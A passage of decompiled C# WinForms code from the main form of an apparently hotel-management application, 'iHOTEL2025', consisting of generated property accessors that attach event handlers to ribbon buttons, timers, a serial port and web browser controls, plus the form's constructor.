			if (_TimerSerials != null)
			{
				_TimerSerials.Tick += value2;
			}
		}
	}

	internal virtual RibbonPanel RibbonPanel7
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonPanel7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonPanel7 = value;
		}
	}

	internal virtual RibbonBar RibbonBar_7
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonBar18;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonBar18 = value;
		}
	}

	internal virtual ButtonItem ButtonItem39
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem39;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem39_Click_1;
			if (_ButtonItem39 != null)
			{
				_ButtonItem39.Click -= value2;
			}
			_ButtonItem39 = value;
			if (_ButtonItem39 != null)
			{
				_ButtonItem39.Click += value2;
			}
		}
	}

	internal virtual RibbonTabItem RibbonTabItem2
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonTabItem2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonTabItem2 = value;
		}
	}

	internal virtual ButtonItem B11_2
	{
		[DebuggerNonUserCode]
		get
		{
			return _B11_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = B11_2_Click;
			if (_B11_2 != null)
			{
				_B11_2.Click -= value2;
			}
			_B11_2 = value;
			if (_B11_2 != null)
			{
				_B11_2.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem41
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem41;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem41_Click_1;
			if (_ButtonItem41 != null)
			{
				_ButtonItem41.Click -= value2;
			}
			_ButtonItem41 = value;
			if (_ButtonItem41 != null)
			{
				_ButtonItem41.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem42
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem42;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem42_Click_1;
			if (_ButtonItem42 != null)
			{
				_ButtonItem42.Click -= value2;
			}
			_ButtonItem42 = value;
			if (_ButtonItem42 != null)
			{
				_ButtonItem42.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem40
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem40;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem40_Click_1;
			if (_ButtonItem40 != null)
			{
				_ButtonItem40.Click -= value2;
			}
			_ButtonItem40 = value;
			if (_ButtonItem40 != null)
			{
				_ButtonItem40.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem43
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem43;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem43_Click_1;
			if (_ButtonItem43 != null)
			{
				_ButtonItem43.Click -= value2;
			}
			_ButtonItem43 = value;
			if (_ButtonItem43 != null)
			{
				_ButtonItem43.Click += value2;
			}
		}
	}

	internal virtual ButtonItem R1
	{
		[DebuggerNonUserCode]
		get
		{
			return _R1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem45_Click_1;
			if (_R1 != null)
			{
				_R1.Click -= value2;
			}
			_R1 = value;
			if (_R1 != null)
			{
				_R1.Click += value2;
			}
		}
	}

	internal virtual ButtonItem R2
	{
		[DebuggerNonUserCode]
		get
		{
			return _R2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem47_Click_1;
			if (_R2 != null)
			{
				_R2.Click -= value2;
			}
			_R2 = value;
			if (_R2 != null)
			{
				_R2.Click += value2;
			}
		}
	}

	internal virtual ButtonItem R3
	{
		[DebuggerNonUserCode]
		get
		{
			return _R3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem50_Click_1;
			if (_R3 != null)
			{
				_R3.Click -= value2;
			}
			_R3 = value;
			if (_R3 != null)
			{
				_R3.Click += value2;
			}
		}
	}

	internal virtual ButtonItem R4
	{
		[DebuggerNonUserCode]
		get
		{
			return _R4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem51_Click_1;
			if (_R4 != null)
			{
				_R4.Click -= value2;
			}
			_R4 = value;
			if (_R4 != null)
			{
				_R4.Click += value2;
			}
		}
	}

	internal virtual ButtonItem R5
	{
		[DebuggerNonUserCode]
		get
		{
			return _R5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem52_Click_1;
			if (_R5 != null)
			{
				_R5.Click -= value2;
			}
			_R5 = value;
			if (_R5 != null)
			{
				_R5.Click += value2;
			}
		}
	}

	internal virtual ButtonItem R10
	{
		[DebuggerNonUserCode]
		get
		{
			return _R10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem53_Click_1;
			if (_R10 != null)
			{
				_R10.Click -= value2;
			}
			_R10 = value;
			if (_R10 != null)
			{
				_R10.Click += value2;
			}
		}
	}

	internal virtual ButtonItem R11
	{
		[DebuggerNonUserCode]
		get
		{
			return _R11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = R11_Click;
			if (_R11 != null)
			{
				_R11.Click -= value2;
			}
			_R11 = value;
			if (_R11 != null)
			{
				_R11.Click += value2;
			}
		}
	}

	internal virtual ButtonItem R12
	{
		[DebuggerNonUserCode]
		get
		{
			return _R12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem55_Click;
			if (_R12 != null)
			{
				_R12.Click -= value2;
			}
			_R12 = value;
			if (_R12 != null)
			{
				_R12.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem45
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem45;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem45_Click_2;
			if (_ButtonItem45 != null)
			{
				_ButtonItem45.Click -= value2;
			}
			_ButtonItem45 = value;
			if (_ButtonItem45 != null)
			{
				_ButtonItem45.Click += value2;
			}
		}
	}

	internal virtual ButtonItem R8
	{
		[DebuggerNonUserCode]
		get
		{
			return _R8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem47_Click_2;
			if (_R8 != null)
			{
				_R8.Click -= value2;
			}
			_R8 = value;
			if (_R8 != null)
			{
				_R8.Click += value2;
			}
		}
	}

	internal virtual ButtonItem R9
	{
		[DebuggerNonUserCode]
		get
		{
			return _R9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem50_Click_2;
			if (_R9 != null)
			{
				_R9.Click -= value2;
			}
			_R9 = value;
			if (_R9 != null)
			{
				_R9.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem56
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem56;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem56_Click_1;
			if (_ButtonItem56 != null)
			{
				_ButtonItem56.Click -= value2;
			}
			_ButtonItem56 = value;
			if (_ButtonItem56 != null)
			{
				_ButtonItem56.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem57
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem57;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem57_Click_1;
			if (_ButtonItem57 != null)
			{
				_ButtonItem57.Click -= value2;
			}
			_ButtonItem57 = value;
			if (_ButtonItem57 != null)
			{
				_ButtonItem57.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem58
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem58;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem58_Click_1;
			if (_ButtonItem58 != null)
			{
				_ButtonItem58.Click -= value2;
			}
			_ButtonItem58 = value;
			if (_ButtonItem58 != null)
			{
				_ButtonItem58.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem5
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem5_Click_3;
			if (_ButtonItem5 != null)
			{
				_ButtonItem5.Click -= value2;
			}
			_ButtonItem5 = value;
			if (_ButtonItem5 != null)
			{
				_ButtonItem5.Click += value2;
			}
		}
	}

	internal virtual ButtonItem R7
	{
		[DebuggerNonUserCode]
		get
		{
			return _R7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem20_Click_1;
			if (_R7 != null)
			{
				_R7.Click -= value2;
			}
			_R7 = value;
			if (_R7 != null)
			{
				_R7.Click += value2;
			}
		}
	}

	internal virtual ButtonItem R14
	{
		[DebuggerNonUserCode]
		get
		{
			return _R14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_R14 = value;
		}
	}

	internal virtual ButtonItem R16
	{
		[DebuggerNonUserCode]
		get
		{
			return _R16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem50_Click_3;
			if (_R16 != null)
			{
				_R16.Click -= value2;
			}
			_R16 = value;
			if (_R16 != null)
			{
				_R16.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem20
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem20;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem20_Click_2;
			if (_ButtonItem20 != null)
			{
				_ButtonItem20.Click -= value2;
			}
			_ButtonItem20 = value;
			if (_ButtonItem20 != null)
			{
				_ButtonItem20.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem50
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem50;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem50_Click_4;
			if (_ButtonItem50 != null)
			{
				_ButtonItem50.Click -= value2;
			}
			_ButtonItem50 = value;
			if (_ButtonItem50 != null)
			{
				_ButtonItem50.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem11
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem11_Click_1;
			if (_ButtonItem11 != null)
			{
				_ButtonItem11.Click -= value2;
			}
			_ButtonItem11 = value;
			if (_ButtonItem11 != null)
			{
				_ButtonItem11.Click += value2;
			}
		}
	}

	internal virtual ButtonItem R6
	{
		[DebuggerNonUserCode]
		get
		{
			return _R6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem12_Click_1;
			if (_R6 != null)
			{
				_R6.Click -= value2;
			}
			_R6 = value;
			if (_R6 != null)
			{
				_R6.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem12
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem12_Click_2;
			if (_ButtonItem12 != null)
			{
				_ButtonItem12.Click -= value2;
			}
			_ButtonItem12 = value;
			if (_ButtonItem12 != null)
			{
				_ButtonItem12.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem30
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem30;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem30_Click_1;
			if (_ButtonItem30 != null)
			{
				_ButtonItem30.Click -= value2;
			}
			_ButtonItem30 = value;
			if (_ButtonItem30 != null)
			{
				_ButtonItem30.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem46
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem46;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem46_Click;
			if (_ButtonItem46 != null)
			{
				_ButtonItem46.Click -= value2;
			}
			_ButtonItem46 = value;
			if (_ButtonItem46 != null)
			{
				_ButtonItem46.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem47
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem47;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem47_Click_3;
			if (_ButtonItem47 != null)
			{
				_ButtonItem47.Click -= value2;
			}
			_ButtonItem47 = value;
			if (_ButtonItem47 != null)
			{
				_ButtonItem47.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem51
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem51;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem51_Click_2;
			if (_ButtonItem51 != null)
			{
				_ButtonItem51.Click -= value2;
			}
			_ButtonItem51 = value;
			if (_ButtonItem51 != null)
			{
				_ButtonItem51.Click += value2;
			}
		}
	}

	internal virtual LabelItem LabelItem4
	{
		[DebuggerNonUserCode]
		get
		{
			return _LabelItem4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_LabelItem4 = value;
		}
	}

	internal virtual Timer TimerMouse
	{
		[DebuggerNonUserCode]
		get
		{
			return _TimerMouse;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = TimerMouse_Tick;
			if (_TimerMouse != null)
			{
				_TimerMouse.Tick -= value2;
			}
			_TimerMouse = value;
			if (_TimerMouse != null)
			{
				_TimerMouse.Tick += value2;
			}
		}
	}

	internal virtual SerialPort SerialPort2
	{
		[DebuggerNonUserCode]
		get
		{
			return _SerialPort2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_SerialPort2 = value;
		}
	}

	internal virtual ButtonItem ButtonNotification
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonNotification;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonNotification_Click;
			if (_ButtonNotification != null)
			{
				_ButtonNotification.Click -= value2;
			}
			_ButtonNotification = value;
			if (_ButtonNotification != null)
			{
				_ButtonNotification.Click += value2;
			}
		}
	}

	internal virtual LabelItem LabelItemNotify
	{
		[DebuggerNonUserCode]
		get
		{
			return _LabelItemNotify;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_LabelItemNotify = value;
		}
	}

	internal virtual Timer TimerNotifly
	{
		[DebuggerNonUserCode]
		get
		{
			return _TimerNotifly;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = TimerNotifly_Tick;
			if (_TimerNotifly != null)
			{
				_TimerNotifly.Tick -= value2;
			}
			_TimerNotifly = value;
			if (_TimerNotifly != null)
			{
				_TimerNotifly.Tick += value2;
			}
		}
	}

	internal virtual Timer TimerCheckNotify
	{
		[DebuggerNonUserCode]
		get
		{
			return _TimerCheckNotify;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = TimerCheckNotify_Tick;
			if (_TimerCheckNotify != null)
			{
				_TimerCheckNotify.Tick -= value2;
			}
			_TimerCheckNotify = value;
			if (_TimerCheckNotify != null)
			{
				_TimerCheckNotify.Tick += value2;
			}
		}
	}

	internal virtual LabelItem LabelItem6
	{
		[DebuggerNonUserCode]
		get
		{
			return _LabelItem6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_LabelItem6 = value;
		}
	}

	internal virtual ButtonItem ButtonItem52
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem52;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem52_Click_2;
			if (_ButtonItem52 != null)
			{
				_ButtonItem52.Click -= value2;
			}
			_ButtonItem52 = value;
			if (_ButtonItem52 != null)
			{
				_ButtonItem52.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem53
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem53;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem53_Click_2;
			if (_ButtonItem53 != null)
			{
				_ButtonItem53.Click -= value2;
			}
			_ButtonItem53 = value;
			if (_ButtonItem53 != null)
			{
				_ButtonItem53.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem_Version
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem_Version;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem_Version_Click;
			if (_ButtonItem_Version != null)
			{
				_ButtonItem_Version.Click -= value2;
			}
			_ButtonItem_Version = value;
			if (_ButtonItem_Version != null)
			{
				_ButtonItem_Version.Click += value2;
			}
		}
	}

	internal virtual WebBrowser WebBrowser2
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			WebBrowserDocumentCompletedEventHandler value2 = WebBrowser2_DocumentCompleted;
			if (_WebBrowser2 != null)
			{
				_WebBrowser2.DocumentCompleted -= value2;
			}
			_WebBrowser2 = value;
			if (_WebBrowser2 != null)
			{
				_WebBrowser2.DocumentCompleted += value2;
			}
		}
	}

	internal virtual Timer TimerChkVer
	{
		[DebuggerNonUserCode]
		get
		{
			return _TimerChkVer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = TimerChkVer_Tick;
			if (_TimerChkVer != null)
			{
				_TimerChkVer.Tick -= value2;
			}
			_TimerChkVer = value;
			if (_TimerChkVer != null)
			{
				_TimerChkVer.Tick += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem54
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem54;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem54_Click_1;
			if (_ButtonItem54 != null)
			{
				_ButtonItem54.Click -= value2;
			}
			_ButtonItem54 = value;
			if (_ButtonItem54 != null)
			{
				_ButtonItem54.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem60
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem60;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem60_Click;
			if (_ButtonItem60 != null)
			{
				_ButtonItem60.Click -= value2;
			}
			_ButtonItem60 = value;
			if (_ButtonItem60 != null)
			{
				_ButtonItem60.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem55
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem55;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem55_Click_1;
			if (_ButtonItem55 != null)
			{
				_ButtonItem55.Click -= value2;
			}
			_ButtonItem55 = value;
			if (_ButtonItem55 != null)
			{
				_ButtonItem55.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem61
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem61;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem61_Click;
			if (_ButtonItem61 != null)
			{
				_ButtonItem61.Click -= value2;
			}
			_ButtonItem61 = value;
			if (_ButtonItem61 != null)
			{
				_ButtonItem61.Click += value2;
			}
		}
	}

	internal virtual ItemContainer ItemContainer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ItemContainer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ItemContainer1 = value;
		}
	}

	internal virtual ButtonItem ButtonItem62
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem62;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem62_Click;
			if (_ButtonItem62 != null)
			{
				_ButtonItem62.Click -= value2;
			}
			_ButtonItem62 = value;
			if (_ButtonItem62 != null)
			{
				_ButtonItem62.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem59
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem59;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ButtonItem59 = value;
		}
	}

	internal virtual ButtonItem ButtonItem63
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem63;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem63_Click;
			if (_ButtonItem63 != null)
			{
				_ButtonItem63.Click -= value2;
			}
			_ButtonItem63 = value;
			if (_ButtonItem63 != null)
			{
				_ButtonItem63.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem64
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem64;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem64_Click;
			if (_ButtonItem64 != null)
			{
				_ButtonItem64.Click -= value2;
			}
			_ButtonItem64 = value;
			if (_ButtonItem64 != null)
			{
				_ButtonItem64.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem65
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem65;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem65_Click;
			if (_ButtonItem65 != null)
			{
				_ButtonItem65.Click -= value2;
			}
			_ButtonItem65 = value;
			if (_ButtonItem65 != null)
			{
				_ButtonItem65.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem66
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem66;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ButtonItem66 = value;
		}
	}

	internal virtual ButtonItem ButtonItem67
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem67;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem67_Click;
			if (_ButtonItem67 != null)
			{
				_ButtonItem67.Click -= value2;
			}
			_ButtonItem67 = value;
			if (_ButtonItem67 != null)
			{
				_ButtonItem67.Click += value2;
			}
		}
	}

	internal virtual Label Label100
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label100;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label100 = value;
		}
	}

	internal virtual ButtonItem ButtonItem68
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem68;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem68_Click;
			if (_ButtonItem68 != null)
			{
				_ButtonItem68.Click -= value2;
			}
			_ButtonItem68 = value;
			if (_ButtonItem68 != null)
			{
				_ButtonItem68.Click += value2;
			}
		}
	}

	internal virtual Timer TimerDate
	{
		[DebuggerNonUserCode]
		get
		{
			return _TimerDate;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = TimerDate_Tick;
			if (_TimerDate != null)
			{
				_TimerDate.Tick -= value2;
			}
			_TimerDate = value;
			if (_TimerDate != null)
			{
				_TimerDate.Tick += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem69
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem69;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem69_Click;
			if (_ButtonItem69 != null)
			{
				_ButtonItem69.Click -= value2;
			}
			_ButtonItem69 = value;
			if (_ButtonItem69 != null)
			{
				_ButtonItem69.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem70
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem70;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem70_Click;
			if (_ButtonItem70 != null)
			{
				_ButtonItem70.Click -= value2;
			}
			_ButtonItem70 = value;
			if (_ButtonItem70 != null)
			{
				_ButtonItem70.Click += value2;
			}
		}
	}

	internal virtual Timer TimerWeb
	{
		[DebuggerNonUserCode]
		get
		{
			return _TimerWeb;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = TimerWeb_Tick;
			if (_TimerWeb != null)
			{
				_TimerWeb.Tick -= value2;
			}
			_TimerWeb = value;
			if (_TimerWeb != null)
			{
				_TimerWeb.Tick += value2;
			}
		}
	}

	internal virtual WebBrowser WebBrowserBlock
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowserBlock;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			WebBrowserDocumentCompletedEventHandler value2 = WebBrowserBlock_DocumentCompleted;
			if (_WebBrowserBlock != null)
			{
				_WebBrowserBlock.DocumentCompleted -= value2;
			}
			_WebBrowserBlock = value;
			if (_WebBrowserBlock != null)
			{
				_WebBrowserBlock.DocumentCompleted += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem71
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem71;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem71_Click;
			if (_ButtonItem71 != null)
			{
				_ButtonItem71.Click -= value2;
			}
			_ButtonItem71 = value;
			if (_ButtonItem71 != null)
			{
				_ButtonItem71.Click += value2;
			}
		}
	}

	internal virtual Timer Timer_0
	{
		[DebuggerNonUserCode]
		get
		{
			return _TimerUPDATE;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = TimerUPDATE_Tick;
			if (_TimerUPDATE != null)
			{
				_TimerUPDATE.Tick -= value2;
			}
			_TimerUPDATE = value;
			if (_TimerUPDATE != null)
			{
				_TimerUPDATE.Tick += value2;
			}
		}
	}

	internal virtual ButtonItem B23
	{
		[DebuggerNonUserCode]
		get
		{
			return _B23;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem37_Click;
			if (_B23 != null)
			{
				_B23.Click -= value2;
			}
			_B23 = value;
			if (_B23 != null)
			{
				_B23.Click += value2;
			}
		}
	}

	[DebuggerNonUserCode]
	static frmMain1()
	{
		Class2.LH6iGfYz9j3MJ();
		__ENCList = new List<WeakReference>();
	}

	public frmMain1()
	{
		Class2.LH6iGfYz9j3MJ();
		// base._002Ector();  // REF: stripped — see _ReferenceStubs.cs
		base.Activated += frmMain1_Activated;
		base.Deactivate += frmMain1_Deactivate;
		base.Load += frmMain1_Load;
		lock (__ENCList)
		{
			__ENCList.Add(new WeakReference(this));
		}
		dateNOW = DateTime.Now;
		string_0 = "";
		countMouse = default(decimal);
		ACT = false;
		ISOVER = false;
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(iHOTEL2025.frmMain1));
